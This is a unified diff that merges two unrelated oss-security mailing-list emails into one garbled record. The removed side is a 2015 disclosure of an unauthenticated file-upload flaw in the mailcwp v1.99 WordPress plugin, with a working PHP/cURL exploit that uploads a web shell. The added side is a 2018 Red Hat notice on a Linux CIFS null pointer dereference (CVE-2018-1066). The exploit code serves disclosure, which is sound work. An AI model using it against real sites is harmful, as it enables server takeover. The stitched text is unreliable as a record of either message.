@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2169" "Thursday" "16" "July" "2015" "20:18:11" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<3D0C5C47-9A9D-4C95-BF08-4AE4482C637E@me.com>" "55" "[oss-security] Remote file upload vulnerability in mailcwp v1.99 wordpress plugin" nil nil nil "7" "2015071700:18:11" "[oss-security] Remote file upload vulnerability in mailcwp v1.99 wordpress plugin" (number mark "U       larry0@me.co Jul 16   55/2169  " thread-indent "\"[oss-security] Remote file upload vulnerability in mailcwp v1.99 wordpress plugin\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["754" "Tuesday" "6" "March" "2018" "14:07:43" "+1000" "Wade Mealing" "wmealing@redhat.com" "<CALJHwhTFmGV=uM0NUxE1Bs5fG3nmMATEOW=bJ6jzO2XzePNaQw@mail.gmail.com>" "25" "[oss-security] CVE-2018-1066 : kernel - CIFS - Null pointer dereference in ntlmv2 response client crash." nil nil nil "3" "2018030604:07:43" "[oss-security] CVE-2018-1066 : kernel - CIFS - Null pointer dereference in ntlmv2 response client crash." (number mark "U       wmealing@red Mar  6   25/754   " thread-indent "\"[oss-security] CVE-2018-1066 : kernel - CIFS - Null pointer dereference in ntlmv2 response client crash.\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 1883 invoked by uid 550); 17 Jul 2015 00:18:32 -0000
+Received: (qmail 28152 invoked by uid 550); 6 Mar 2018 04:07:57 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,76 +11,54 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 1840 invoked from network); 17 Jul 2015 00:18:25 -0000
-X-Proofpoint-Virus-Version: vendor=fsecure
- engine=2.50.10432:5.14.151,1.0.33,0.0.0000
- definitions=2015-07-16_06:2015-07-16,2015-07-16,1970-01-01 signatures=0
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
- suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
- reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1507170001
-Content-type: text/plain; charset=utf-8
-Content-transfer-encoding: quoted-printable
-Message-id: <3D0C5C47-9A9D-4C95-BF08-4AE4482C637E@me.com>
-MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
-X-Mailer: Apple Mail (2.2098)
-Date: Thu, 16 Jul 2015 20:18:11 -0400
-From: "Larry W. Cashdollar" <larry0@me.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Remote file upload vulnerability in mailcwp v1.99 wordpress plugin
-To: Open Source Security <oss-security@lists.openwall.com>
+Received: (qmail 28119 invoked from network); 6 Mar 2018 04:07:56 -0000
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=Lc1FGE5Jnr1jGg8Z8GznSyDjFqa2Z2NOXyELVxXmLb4=;
+        b=fzGnGRxZ8jwt2+yWFmJFwzTOjv/Ly3auQJSGlFe663wqQpjiZUDXaf0dx7w1M+6UEm
+         B+3LiztCdXIo4wJX0hDXjoN/W8r5h69X2bkjBjielDBTQqhMUkUQcjKvIVK1kbJYGo7/
+         Ov9w7pAvDd5jLf5q3la8gCETh5Hu9Va32gPBoKwAY4dBnDcwhRJyuqymHT5+0BNYOF1b
+         F0uEwSRmoLAtQ53wgOmIK5wM4OsVCBDIIKJOCnsIANkIIeqaqDqwvHRRWZ+/YByE4sA9
+         1iX4zw9iu7YxpOm2V5590t3v3vuQrukp14geEw6I2Jyk/+jAWHxlNBaZxgz7Anu/xbux
+         puBg==
+X-Gm-Message-State: APf1xPACDxprnyHVbVtKva16G6XMEI1Pg8b8PBMI18y2Hy30PGHik51d
+	I6KmsGn2SdLfiNknvwT4lAOwglDSEKhxcmnWv71Hwu1giNo=
+X-Google-Smtp-Source: AG47ELtrXWLRBawgmVDQYhHVnMUJ1uj4yNVFLezp3RQ44vp1CrgjFPOkA+e4o4vK7wyKFBGk4i+EgeK5l0+VXTPVRS4=
+X-Received: by 10.107.187.65 with SMTP id l62mr20364232iof.1.1520309264254;
+ Mon, 05 Mar 2018 20:07:44 -0800 (PST)
+MIME-Version: 1.0
+From: Wade Mealing <wmealing@redhat.com>
+Date: Tue, 6 Mar 2018 14:07:43 +1000
+Message-ID: <CALJHwhTFmGV=uM0NUxE1Bs5fG3nmMATEOW=bJ6jzO2XzePNaQw@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: text/plain; charset="UTF-8"
+Subject: [oss-security] CVE-2018-1066 : kernel - CIFS - Null pointer dereference in ntlmv2
+ response client crash.
 
-Title: Remote file upload vulnerability in mailcwp v1.99 wordpress plugin
-Author: Larry W. Cashdollar, @_larry0
-Date: 2015-07-09
-Download Site: https://wordpress.org/plugins/mailcwp/
-Vendor: CadreWorks Pty Ltd
-Vendor Notified: 2015-07-09 fixed in v1.110
-Vendor Contact: Contact Page via WP site
-Description: MailCWP, Mail Client for WordPress. A full-featured mail clien=
-t plugin providing webmail access through your WordPress blog or website.
-Vulnerability:
-The code in mailcwp-upload.php  doesn't check that a user is authenticated =
-or what type of file is being uploaded any user can upload a shell to the t=
-arget wordpress server:
+Gday,
 
-  2 $message_id =3D $_REQUEST["message_id"];
-  3 $upload_dir =3D $_REQUEST["upload_dir"];
-=2E
-=2E
-  8 $fileName =3D $_FILES["file"]["name"];
-  9 move_uploaded_file($_FILES["file"]["tmp_name"], "$upload_dir/$message_i=
-d-$fileName");
+Dan Aloni reported to Red Hat that there was a flaw in the CIFS client
+implementation in kernel that could cause a null pointer dereference
+and panic the a Linux CIFS client.  It would require the server to
+implement the CIFS protocol incorrectly or momentarily impersonate the
+CIFS server during session recovery (such as when the server was shut
+down, or the network conditions were bad). The attacker would need to
+return an empty "TargetInfo" in the NTLMSSP setup negotiation response
+causing the null pointer dereference when interpreted by the client.
 
-Exploitation requires the attacker to guess a writeable location in the htt=
-p server root.
 
-CVEID:
-OSVDB:
-Exploit Code:
-	=E2=80=A2 <?php
-	=E2=80=A2 /*Larry W. Cashdollar @_larry0
-	=E2=80=A2 Exploit for mailcwp v1.99 shell will be called 1-shell.php.
-	=E2=80=A2 7/9/2015
-	=E2=80=A2 */
-	=E2=80=A2         $target_url =3D 'http://www.example.com/wp-content/plugi=
-ns/mailcwp/mailcwp-upload.php?message_id=3D1&upload_dir=3D/usr/share/wordpr=
-ess/wp-content/uploads';
-	=E2=80=A2         $file_name_with_full_path =3D '/var/www/shell.php';
-	=E2=80=A2=20=20
-	=E2=80=A2         echo "POST to $target_url $file_name_with_full_path";
-	=E2=80=A2         $post =3D array('file' =3D> 'shell.php','file'=3D>'@'.$f=
-ile_name_with_full_path);
-	=E2=80=A2=20=20
-	=E2=80=A2         $ch =3D curl_init();
-	=E2=80=A2         curl_setopt($ch, CURLOPT_URL,$target_url);
-	=E2=80=A2         curl_setopt($ch, CURLOPT_POST,1);
-	=E2=80=A2         curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-	=E2=80=A2         curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
-	=E2=80=A2         $result=3Dcurl_exec ($ch);
-	=E2=80=A2         curl_close ($ch);
-	=E2=80=A2         echo "<hr>";
-	=E2=80=A2         echo $result;
-	=E2=80=A2         echo "<hr>";
-	=E2=80=A2 ?>
-	=E2=80=A2=20=20
-Advisory: http://www.vapid.dhs.org/advisory.php?v=3D138=
+Report ( and patch )
+
+https://patchwork.kernel.org/patch/10187633/
+
+
+RedHat Bugzilla:
+
+https://bugzilla.redhat.com/show_bug.cgi?id=1539599
+
+Thanks,
+
+Wade Mealing
+Red Hat Product Security
